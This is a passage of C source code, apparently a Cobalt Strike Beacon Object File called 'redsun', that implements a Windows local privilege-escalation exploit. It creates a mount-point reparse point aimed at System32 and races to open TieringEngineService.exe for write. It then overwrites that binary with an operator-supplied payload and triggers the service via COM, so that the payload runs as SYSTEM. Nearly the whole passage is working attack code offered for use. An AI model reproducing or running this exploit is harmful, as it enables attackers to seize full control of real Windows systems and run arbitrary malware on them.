        FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_oa, &iostat,
        NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, 0);
    if (stat) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: NtCreateFile (workdir reopen): 0x%08X\n", stat);
        NtClose(hfile);
        CloseHandle(ovd.hEvent);
        CloseHandle(hthread);
        CloseHandle(hpipe);
        goto cleanup;
    }

    wchar_t rptgt[] = L"\\??\\C:\\Windows\\System32";
    DWORD targetsz    = (DWORD)(lstrlenW(rptgt) * sizeof(wchar_t));
    DWORD printnamesz = sizeof(wchar_t);
    DWORD pathbufsz   = targetsz + printnamesz + 12;
    DWORD totalsz     = pathbufsz + RS_REPARSE_HDR_LEN;

    PRS_REPARSE_DATA_BUFFER rdb = (PRS_REPARSE_DATA_BUFFER)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, totalsz);
    if (rdb) {
        rdb->ReparseTag                              = IO_REPARSE_TAG_MOUNT_POINT;
        rdb->ReparseDataLength                       = (USHORT)pathbufsz;
        rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
        rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetsz;
        memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptgt, targetsz + sizeof(wchar_t));
        rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetsz + sizeof(wchar_t));
        rdb->MountPointReparseBuffer.PrintNameLength = (USHORT)printnamesz;
        memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / sizeof(wchar_t) + 1,
               rptgt, printnamesz);
        DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, 0, NULL, NULL);
        HeapFree(GetProcessHeap(), 0, rdb);
    }

    NtClose(hfile);
    CloseHandle(ovd.hEvent);

    /* ── Race to open System32\TieringEngineService.exe for write ── */
    HANDLE hlk = NULL;
    for (int i = 0; i < 1000; i++) {
        wchar_t malpath[] = L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe";
        UNICODE_STRING _umal = { 0 };
        RtlInitUnicodeString(&_umal, malpath);
        OBJECT_ATTRIBUTES oa3 = { 0 };
        InitializeObjectAttributes(&oa3, &_umal, OBJ_CASE_INSENSITIVE, NULL, NULL);
        ZeroMemory(&iostat, sizeof(iostat));
        stat = NtCreateFile(&hlk, GENERIC_WRITE, &oa3, &iostat,
                             NULL, 0,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             FILE_SUPERSEDE, 0, NULL, 0);
        if (!stat) break;
        Sleep(20);
    }

    if (stat) {
        BeaconPrintf(CALLBACK_ERROR, "redsun: Failed to open TieringEngineService.exe for write\n");
        NtClose(hrp);
        CloseHandle(hthread);
        CloseHandle(hpipe);
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "redsun: The red sun shall prevail.\n");
    NtClose(hlk);
    NtClose(hrp);

    /* ── Copy operator payload to TieringEngineService.exe ── */
    wchar_t svc_path[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\TieringEngineService.exe",
                               svc_path, MAX_PATH);
    if (!CopyFileW(payloadW, svc_path, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR,
            "redsun: CopyFile payload -> TieringEngineService.exe: %d\n", GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "redsun: Payload staged at %ws\n", svc_path);
    }

    /* ── Trigger TieringEngineService via COM (runs as SYSTEM) ── */
    CoInitialize(NULL);
    GUID guidSvc = { 0x50d185b9, 0xfff3, 0x4656,
                     {0x92, 0xc7, 0xe4, 0x01, 0x8d, 0xa4, 0x36, 0x1d} };
    PVOID dummy = NULL;
    CoCreateInstance(&guidSvc, NULL, CLSCTX_LOCAL_SERVER, &guidSvc, &dummy);
    CoUninitialize();

    Sleep(2000);

    CloseHandle(hthread);
    CloseHandle(hpipe);
    BeaconPrintf(CALLBACK_OUTPUT, "redsun: Done\n");

cleanup:
    if (hcldapi)   FreeLibrary(hcldapi);
    if (hole32)    FreeLibrary(hole32);
    if (holeaut32) FreeLibrary(holeaut32);
    if (hkernbase) FreeLibrary(hkernbase);
}
